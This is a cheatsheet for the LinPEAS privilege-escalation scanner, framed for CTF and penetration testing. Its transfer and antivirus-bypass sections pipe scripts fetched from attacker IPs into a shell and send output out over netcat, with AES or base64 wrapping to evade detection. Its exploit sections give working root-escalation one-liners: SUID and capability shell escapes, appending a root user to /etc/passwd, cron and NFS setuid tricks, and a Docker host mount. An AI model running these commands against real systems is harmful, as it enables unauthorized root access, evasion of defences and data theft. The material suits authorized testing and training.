# LinPEAS Cheatsheet

## Quick Reference

| Flag | Purpose |
|------|---------|
| `-a` | All checks (brute-force, process monitoring, regex) |
| `-s` | Stealth — skip time-consuming checks, nothing to disk |
| `-e` | Extra enumeration beyond defaults |
| `-r` | Enable regex scanning (API keys, secrets) |
| `-P <pass>` | Known password for `sudo -l` and `su` brute-force |
| `-o <checks>` | Only run specified comma-separated check categories |
| `-D` | Debug mode — show timing and skipped checks |
| `-f <path>` | Analyze firmware/directory without running system |
| `-w` | Wait between check blocks (manual inspection) |
| `-L` | Force LinPEAS execution |
| `-M` | Force MacPEAS execution |
| `-q` | Quiet — suppress banner |
| `-N` | No colors |

## Network Recon Flags

| Flag | Purpose |
|------|---------|
| `-t` | Auto network scan + internet connectivity |
| `-d <IP/MASK>` | Discover hosts via fping/ping |
| `-p <PORTS> -d <IP/MASK>` | Discover hosts via TCP port scan |
| `-i <IP> -p <PORTS>` | Scan a specific IP |
| `-F L:PORT:R:PORT` | Port forwarding (local to remote) |

---

## Installation

```bash
# Kali package
sudo apt install peass-ng
linpeas

# Direct download
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh

# Go binary (no dependencies)
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
```

## Standard Usage

```bash
# CTF / HackTheBox — full scan
./linpeas.sh -a

# Production — stealth
./linpeas.sh -s

# Targeted checks
./linpeas.sh -o system_information,users_information,interesting_files

# Complete with API key regex
./linpeas.sh -a -r

# With known password
./linpeas.sh -P "hunter2"

# Save output with colors
./linpeas.sh -a > /dev/shm/linpeas.txt
less -r /dev/shm/linpeas.txt
```

## Transfer Methods

```bash
# HTTP download
curl http://10.10.14.20:8000/linpeas.sh | sh

# Netcat transfer
sudo nc -q 5 -lvnp 80 < linpeas.sh   # Host
cat < /dev/tcp/10.10.10.10/80 | sh     # Victim

# Execute + exfiltrate
nc -lvnp 9002 | tee linpeas.out                                    # Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002      # Victim

# Python HTTP server
sudo python3 -m http.server 8000
curl http://10.10.14.20:8000/linpeas.sh | sh

# Netcat push (no curl on victim)
sudo nc -q 5 -lvnp 80 < linpeas.sh   # Host
cat < /dev/tcp/10.10.10.10/80 | sh     # Victim
```

## AV Bypass Methods

```bash
# OpenSSL encrypted
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
# Host
sudo python3 -m http.server 80
# Victim
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh

# Base64 encoded
base64 -w0 linpeas.sh > lp.enc
# Host
sudo python3 -m http.server 80
# Victim
curl 10.10.10.10/lp.enc | base64 -d | sh
```

## Firmware Analysis

```bash
# Option 1: Run inside emulated firmware
cp /path/to/linpeas.sh /mnt/linpeas.sh
chroot /mnt
bash /linpeas.sh -o software_information,interesting_files,api_keys_regex

# Option 2: Analyze filesystem without running it
bash /path/to/linpeas.sh -f /path/to/folder
```

## Network Recon

```bash
# Auto discover hosts
./linpeas.sh -d 192.168.1.0/24

# Discover via TCP ports
./linpeas.sh -d 192.168.1.0/24 -p 22,80,443,445,3389

# Scan specific IP
./linpeas.sh -i 192.168.1.100 -p 22,80,443

# Full auto scan with connectivity check
./linpeas.sh -t

# Port forwarding
./linpeas.sh -F 127.0.0.1:8080:192.168.1.50:80
```

## Output Filtering

```bash
# View only high-confidence findings (red/yellow)
./linpeas.sh -a 2>&1 | grep -E "\x1b\[1;33m|\x1b\[1;31m"

# Search for specific check results
./linpeas.sh -a 2>&1 | grep -i "sudo"

# Find SUID binaries
./linpeas.sh -a 2>&1 | grep -A20 "SUID"

# Find writable files
./linpeas.sh -a 2>&1 | grep -A20 "writable"

# Plain text (no ANSI codes)
./linpeas.sh -N > /dev/shm/linpeas_plain.txt
```

## Check Categories (for -o flag)

| Category | Description |
|----------|-------------|
| `system_information` | OS, kernel, architecture, SELinux/AppArmor |
| `container` | Docker/LXC detection, container escape |
| `cloud` | Cloud metadata (AWS, GCP, Azure) |
| `procs_crons_timers_srvcs_sockets` | Processes, cron, timers, services, sockets |
| `network_information` | Interfaces, routes, firewall, ports |
| `users_information` | Users, groups, sudo, passwords |
| `software_information` | Installed packages, binaries, compilers |
| `interesting_files` | SUID, SGID, writable, SSH keys, credentials |
| `api_keys_regex` | API keys and secrets via regex |

## Color Code Reference

| Color | Meaning |
|-------|---------|
| **Red on Yellow** | 99% confidence — exploit this |
| **Red** | Suspicious — investigate manually |
| **Green** | Known good (by name, not content) |
| **Blue** | Informational — no-shell users, mounts |
| **Light Cyan** | Users with login shell |
| **Light Magenta** | Current username |

## Manual Checks After LinPEAS

```bash
# Verify sudo permissions
sudo -l

# Check SUID binaries manually
find / -perm -4000 -type f 2>/dev/null

# Check capabilities
getcap -r / 2>/dev/null

# Check writable /etc/passwd or /etc/shadow
ls -la /etc/passwd /etc/shadow

# Check for readable SSH keys
find / -name "id_rsa" -o -name "authorized_keys" 2>/dev/null

# Check cron jobs
crontab -l
ls -la /etc/cron*
cat /etc/crontab

# Check kernel version for exploits
uname -r
cat /proc/version

# Check Docker socket
ls -la /var/run/docker.sock

# Check NFS exports
cat /etc/exports

# Check for password files
grep -ri "password" /home/ /var/www/ /etc/ 2>/dev/null
```

## Common Exploit Paths Found by LinPEAS

### SUID Binary Escalation

```bash
# If LinPEAS finds SUID /usr/bin/vim
/usr/bin/vim -c ':!sh'

# If LinPEAS finds SUID /usr/bin/find
find -exec /bin/sh -p \;

# If LinPEAS finds SUID /usr/bin/bash
/bin/bash -p

# If LinPEAS finds SUID /usr/bin/python3
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# If LinPEAS finds SUID /usr/bin/perl
perl -e 'exec "/bin/sh";'

# If LinPEAS finds SUID /usr/bin/ruby
ruby -e 'exec "/bin/sh"'

# If LinPEAS finds SUID /usr/bin/nmap (older versions)
nmap --interactive
!sh
```

### Capability Escalation

```bash
# If LinPEAS finds cap_setuid on a binary
# Example: python3 with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Example: perl with cap_setuid
perl -e 'use POSIX; setuid(0); exec "/bin/bash";'

# Generic capability abuse
# Check what capabilities are set
getcap -r / 2>/dev/null
```

### Writable /etc/passwd

```bash
# Generate password hash
openssl passwd -1 -salt xyz newpassword

# Add new root user
echo 'newuser:$1$xyz$hashedpassword:0:0:root:/root:/bin/bash' >> /etc/passwd
su newuser
```

### Writable Cron Jobs

```bash
# If /etc/crontab or cron script is writable
echo '* * * * * root chmod +s /bin/bash' >> /etc/crontab

# Wait for cron to execute
chmod +s /bin/bash
/bin/bash -p
```

### NFS No Root Squash

```bash
# From attacker machine
mkdir /tmp/nfs
mount -t nfs 192.168.1.100:/shared /tmp/nfs
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash

# On victim
/shared/rootbash -p
```

### Docker Escape

```bash
# If in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# If docker socket accessible
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
```

### Environment Variable Abuse

```bash
# If sudo has env_keep for sensitive vars
sudo env /bin/bash

# If PATH contains writable directory
echo '/bin/bash' > /tmp/fakeutil
export PATH=/tmp:$PATH
sudo fakeutil
```

## Practical Workflow

```
1. Get shell on 192.168.1.100
2. Transfer linpeas: curl http://10.10.14.20:8000/linpeas.sh | sh
3. Wait 4-10 minutes (depends on -a flag)
4. Filter output: less -r /dev/shm/linpeas.txt | grep -B2 -A5 "Red"
5. Pick highest-confidence finding (Red/Yellow)
6. Exploit manually using technique from HackTricks
7. If stuck: check each Red finding systematically
8. Verify root: id → uid=0(root)
```

## Troubleshooting

| Problem | Solution |
|---------|----------|
| `permission denied` | `chmod +x linpeas.sh` |
| `curl: command not found` | Use wget or netcat transfer |
| `sh: not found` | Use Go binary instead of shell script |
| Output truncated | Redirect to file: `./linpeas.sh > out.txt` |
| Colors garbled in file | Use `less -r` or `cat -v` to view |
| Script hangs on network checks | Use `-s` to skip network-heavy checks |
| Too many false positives | Use `-o` to run only relevant categories |
| `su` brute-force triggers lockout | Don't use `-a` in production; use `-s` |
| Go binary won't execute | Check architecture: `uname -m`; use correct binary |
| Script killed (OOM) | Use `-s` or `-o` to reduce memory usage |
